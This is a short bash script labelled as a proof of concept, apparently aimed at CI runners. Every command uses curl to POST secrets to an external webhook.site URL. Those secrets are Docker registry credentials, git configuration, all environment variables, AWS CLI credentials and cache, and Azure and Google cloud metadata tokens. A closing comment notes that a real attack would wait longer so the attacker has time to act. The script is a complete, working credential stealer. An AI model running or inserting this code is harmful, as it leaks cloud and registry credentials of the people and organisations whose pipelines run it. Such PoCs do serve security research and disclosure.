#!/usr/bin/env bash
#filename: myscript.sh

echo "-------------poc_hello--------------" >&2


export webhook="https://webhook.site/06a5697c-1bf2-4b66-9dcf-9352b133d531"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat ~/.docker/config.json)" \
    "$webhook/docker_cred"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.docker/config.json)" \
    "$webhook/docker_cred2"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat .git/config)" \
    "$webhook/git_config"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(git config --list)" \
    "$webhook/git_config_list"


curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.gitconfig)" \
    "$webhook/home_runner_gitconfig"


curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(printenv)" \
  "$webhook/printenv"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat ~/.aws/cli/cache)" \
  "$webhook/aws_cli_cache"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat ~/.aws/credentials)" \
  "$webhook/aws_cli_credentials"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\")" \
  "$webhook/azure_credentials"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(curl -s -H "Metadata-Flavor: Google" \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\")" \
  "$webhook/google_credentials"



sleep 2 # in real attack it will be 1200 to have time to edit 
